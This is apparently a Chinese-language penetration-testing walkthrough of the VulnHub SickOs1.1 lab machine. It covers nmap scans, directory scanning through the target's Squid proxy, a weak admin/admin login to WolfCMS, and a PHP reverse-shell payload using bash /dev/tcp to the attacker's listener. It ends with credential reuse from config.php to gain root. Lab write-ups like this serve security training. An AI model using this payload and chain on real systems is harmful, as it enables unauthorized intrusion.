# SickOs1.1 渗透实现

-   靶机地址：https://www.vulnhub.com/entry/sickos-11,132/
-   下载地址：https://download.vulnhub.com/sickos/sick0s1.1.7z

## 信息收集

### 主机发现

```shell
└─$ sudo nmap -sn 192.168.2.1/24
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 13:46 HKT
Nmap scan report for 192.168.2.1
Host is up (0.00016s latency).
MAC Address: AA:A1:59:52:23:67 (Unknown)
Nmap scan report for 192.168.2.2
Host is up (0.00028s latency).
MAC Address: 00:50:56:E9:75:CA (VMware)
Nmap scan report for 192.168.2.130
Host is up (0.0013s latency).
MAC Address: 00:0C:29:72:6D:18 (VMware)
Nmap scan report for 192.168.2.254
Host is up (0.00025s latency).
MAC Address: 00:50:56:F9:21:09 (VMware)
Nmap scan report for 192.168.2.128
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.96 seconds
                                                                 
```

参数讲解：

-   `-sn` 使用ping进行扫描，不进行端口扫描，减少被目标机发现的风险

### 端口扫描

```shell
# TCP端口扫描
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.2.130 -oA Scan/sT
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 13:49 HKT
Nmap scan report for 192.168.2.130
Host is up (0.00050s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE  SERVICE
22/tcp   open   ssh
3128/tcp open   squid-http
8080/tcp closed http-proxy
MAC Address: 00:0C:29:72:6D:18 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds


# UDP端口扫描
└─$ sudo nmap -sU --min-rate 10000 -p- 192.168.2.130 -oA Scan/sU
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 15:33 HKT
Nmap scan report for 192.168.2.130
Host is up (0.00027s latency).
All 65535 scanned ports on 192.168.2.130 are in ignored states.
Not shown: 65535 open|filtered udp ports (no-response)
MAC Address: 00:0C:29:72:6D:18 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.50 seconds

                                                       
```

参数讲解：

1.   `-sT` 使用TCP扫描
2.   `--min-rate 10000` 使用10000的速率来进行扫描，相对平衡
3.   `-p-` 扫描全端口
4.   `-sU` 使用UDP扫描
5.   `-oA`  将当前扫描出的内容保存到指定文件中

### 服务扫描及系统探测

```shell
└─$ sudo nmap -sC -sV -O -p22,3128,8080 --min-rate 10000 192.168.2.130 -oA Scan/sC   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 13:51 HKT
Nmap scan report for 192.168.2.130
Host is up (0.00052s latency).

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 093d29a0da4814c165141e6a6c370409 (DSA)
|   2048 8463e9a88e993348dbf6d581abf208ec (RSA)
|_  256 51f6eb09f6b3e691ae36370cc8ee3427 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.1.19
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported: GET HEAD
8080/tcp closed http-proxy
MAC Address: 00:0C:29:72:6D:18 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.21 seconds

```

参数讲解：

1.   `-sV` 探测当前的服务版本
2.   `-sC` 调用默认的脚本进行漏洞探测
3.   `-O` 探测目标操作系统版本
4.   `-p `  指定端口进行扫描

### 漏洞探测

```shell
└─$ sudo nmap --script=vuln -p22,3128,8080 192.168.6.2 -oA Scan/script-scan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 15:38 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.6.2
Host is up (0.00026s latency).

PORT     STATE    SERVICE
22/tcp   filtered ssh
3128/tcp filtered squid-http
8080/tcp filtered http-proxy

Nmap done: 1 IP address (1 host up) scanned in 36.73 seconds
                                                             
```

参数讲解：
	`--script-vuln`是Nmap调用的一个漏洞扫描脚本集合，用于检测已知漏洞。以下是其中一些脚本的简要介绍：

1. `http-vuln-*`：用于检测Web应用程序中已知的漏洞，包括SQL注入、文件包含、远程命令执行等。

2. `ssl-*`：用于检测SSL和TLS协议中的漏洞，包括心脏滴血漏洞、POODLE漏洞、BEAST漏洞等。

3. `smb-vuln-*`：用于检测Windows SMB协议中的漏洞，包括EternalBlue漏洞、MS17-010漏洞等。

4. `smtp-vuln-*`：用于检测SMTP协议中的漏洞，包括OpenSMTPD漏洞、Exim漏洞等。

5. `dns-*`：用于检测DNS协议中的漏洞，包括DNS隧道、DNS缓存投毒等。

6. `ssh-*`：用于检测SSH协议中的漏洞，包括SSH漏洞、SSH弱口令等。

7. `ftp-*`：用于检测FTP协议中的漏洞，包括ProFTPD漏洞、VSFTPD漏洞等。

这些脚本的使用方法类似于普通的Nmap扫描，只需在命令中加入`--script vuln`参数即可调用。例如：

nmap -sV --script vuln <target>

这将对目标进行端口扫描，并调用`--script=vuln`中的所有漏洞扫描脚本进行检测。需要注意的是，漏洞扫描脚本可能会产生误报或漏报，因此在实际应用中应该结合其他漏洞扫描工具和手动渗透测试进行综合评估。

## web访问及扫描

-   默认目标页
-   ![image-20230517135342278](https://raw.githubusercontent.com/r0o983/images/main/image-20230517135342278.png)
-   已知信息：超级管理员账号为`webmaster`

### 使用`gobuster`进行目录扫描

```shell
└─$ sudo gobuster dir -u http://192.168.2.130:3128 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[sudo] password for kali: 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.130:3128
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/17 16:00:26 Starting gobuster in directory enumeration mode
===============================================================

Error: the server returns a status code that matches the provided options for non existing urls. http://192.168.2.130:3128/ce631e86-5dd4-465d-a5e4-dadd6012a163 => 400 (Length: 3222). To continue please exclude the status code or the length

```

参数讲解：

1.   `dir` 指定是以查找文件(文件夹)的形式进行扫描
2.   `-u`  指定需要扫描的目标
3.   `-w`  指定需要使用的字典文件进行目录扫描

### 使用`dirb`进行目录扫描

```shell
# 使用默认字典扫描
└─$ dirb http://192.168.2.130:3128                                      

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed May 17 15:52:54 2023
URL_BASE: http://192.168.2.130:3128/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.2.130:3128/ ----
                                                                                                    
-----------------
END_TIME: Wed May 17 15:52:59 2023
DOWNLOADED: 4612 - FOUND: 0
                              
```

-   使用目标机本机进行代理扫描

-   >   └─$ sudo dirb http://192.168.2.130 -p http://192.168.2.130:3128
    >
    >   参数：
    >
    >   -p <proxy[:port]> 指定代理地址
    >                  Use this proxy. (Default port is 1080)

```shell
└─$ sudo dirb http://192.168.2.130 -p http://192.168.2.130:3128

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed May 17 16:02:34 2023
URL_BASE: http://192.168.2.130/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
PROXY: http://192.168.2.130:3128

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.2.130/ ----
+ http://192.168.2.130/cgi-bin/ (CODE:403|SIZE:289)                                                 
+ http://192.168.2.130/connect (CODE:200|SIZE:109)                                                  
+ http://192.168.2.130/index (CODE:200|SIZE:21)                                                     
+ http://192.168.2.130/index.php (CODE:200|SIZE:21)                                                 
+ http://192.168.2.130/robots (CODE:200|SIZE:45)                                                    
+ http://192.168.2.130/robots.txt (CODE:200|SIZE:45)                                                
+ http://192.168.2.130/server-status (CODE:403|SIZE:294)                                            
                                                                                                    
-----------------
END_TIME: Wed May 17 16:02:36 2023
DOWNLOADED: 4612 - FOUND: 7

```

### 查看robots.txt页面文件

![image-20230517161112957](https://raw.githubusercontent.com/r0o983/images/main/image-20230517161112957.png)

-   提示此处有一个`/wolfcms`文件
-   ![image-20230517161150225](https://raw.githubusercontent.com/r0o983/images/main/image-20230517161150225.png)

### 查找后台

-   通过`google exploit-db` 搜索当前cms的版本和利用方式 [点我查看详情](https://www.exploit-db.com/exploits/38000)
-   ![image-20230517162115861](https://raw.githubusercontent.com/r0o983/images/main/image-20230517162115861.png)

-   测试弱密码：`admin` and `admin` 
-   ![image-20230517163312574](https://raw.githubusercontent.com/r0o983/images/main/image-20230517163312574.png)
-   写入反弹`shell`到目标主机中（任意可写有执行权限的文件即可）`<?php exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.2.128/443 0>&1'")>; ?>`
-   在kali中发起监听`nc -nvlp 443`

```shell
# 拿到回弹shell
└─$ sudo nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.2.128] from (UNKNOWN) [192.168.2.130] 41340
whoami
www-data
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@SickOs:/var/www/wolfcms$ whoami
whoami
www-data
www-data@SickOs:/var/www/wolfcms$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:0c:29:72:6d:18 brd ff:ff:ff:ff:ff:ff
    inet 192.168.2.130/24 brd 192.168.2.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fe72:6d18/64 scope link 
       valid_lft forever preferred_lft forever
www-data@SickOs:/var/www/wolfcms$ ls  
ls                                                                                                   
CONTRIBUTING.md  composer.json  docs         index.php  robots.txt                                   
README.md        config.php     favicon.ico  public     wolf                                         
www-data@SickOs:/var/www/wolfcms$                                                                    

```

-   查看`config.php`文件

![image-20230518092110562](https://raw.githubusercontent.com/r0o983/images/main/image-20230518092110562.png)

-   尝试使用root账号和密码来登陆ssh，发现是不可行的。 读取`/etc/passwd`文件内容，查找用户。
-   ![image-20230518092741004](https://raw.githubusercontent.com/r0o983/images/main/image-20230518092741004.png)
-   在当前系统的`home`目录下存在有一个`sickos`的用户，尝试使用刚才获得的密码进行登录

### 获取root权限

-   当前用户`sickos`登录后，默认自带`root`权限

![image-20230518092928321](https://raw.githubusercontent.com/r0o983/images/main/image-20230518092928321.png)
